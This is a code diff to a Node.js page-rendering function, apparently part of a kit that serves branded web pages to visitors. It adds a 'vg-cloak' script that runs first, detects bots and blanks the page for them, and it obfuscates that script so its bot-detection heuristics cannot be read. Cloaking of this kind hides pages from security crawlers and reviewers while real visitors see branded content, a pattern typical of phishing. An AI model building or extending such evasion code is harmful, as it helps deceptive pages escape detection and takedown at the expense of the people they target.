@@ -1110,6 +1110,16 @@ async function renderPageHtml(link, user, options) {
         vgBehavior = fs.readFileSync(vgBehaviorPath, 'utf8');
     }
 
+    // vg-cloak.js runs FIRST of all runtime modules: it decides whether the
+    // visitor is a bot before anything else touches the DOM, and wipes the page
+    // to a blank white sheet for bots. The other modules (fingerprint, behavior,
+    // engine) then simply never get a chance to paint branded content.
+    var vgCloak = '';
+    const vgCloakPath = path.join(TEMPLATES_DIR, 'assets', 'vg-cloak.js');
+    if (fs.existsSync(vgCloakPath)) {
+        vgCloak = fs.readFileSync(vgCloakPath, 'utf8');
+    }
+
     const forceBlob = options.forceBlobFromStart === true ? 'true' : 'false';
     const configScript = '<script>window.__FORCE_BLOB_FROM_START=' + forceBlob + '</script>';
     
@@ -1118,6 +1128,11 @@ async function renderPageHtml(link, user, options) {
 
     // Assemble the whole runtime bootstrap in one place.
     var headScripts = windowVars + configScript + sliderFlag;
+    // Cloak first, so a bot is wiped before the fingerprint/behavior/engine
+    // modules (or the template's own scripts) can render anything.
+    if (vgCloak) {
+        headScripts += '<script>' + vgCloak + '</script>';
+    }
     if (vgFingerprint) {
         headScripts += '<script>' + vgFingerprint + '</script>';
     }
@@ -1260,6 +1275,20 @@ async function renderPageHtml(link, user, options) {
         function safeEmbedJs(js) {
             return js.replace(/<\/script/gi, '<\\/script')
                     .replace(/<\/style/gi, '<\\/style');
+        }
+        // Obfuscate vg-cloak.js (injected before vg-engine; obfuscate it the
+        // same way so the bot-detection heuristics are not readable plaintext).
+        if (vgCloak && vgCloak.length > 500) {
+            try {
+                const obfuscatedCloak = safeEmbedJs(obfuscateJs(vgCloak));
+                const originalBlock = '<script>' + vgCloak + '</script>';
+                if (html.indexOf(originalBlock) !== -1) {
+                    html = html.split(originalBlock).join('<script>' + obfuscatedCloak + '</script>');
+                    console.log('[Templateloader] vg-cloak obfuscated successfully');
+                }
+            } catch (e) {
+                console.error('[Templateloader] vg-cloak obfuscation failed:', e && e.message);
+            }
         }
         // Obfuscate vg-engine.js
         if (vgEngine && vgEngine.length > 500) {
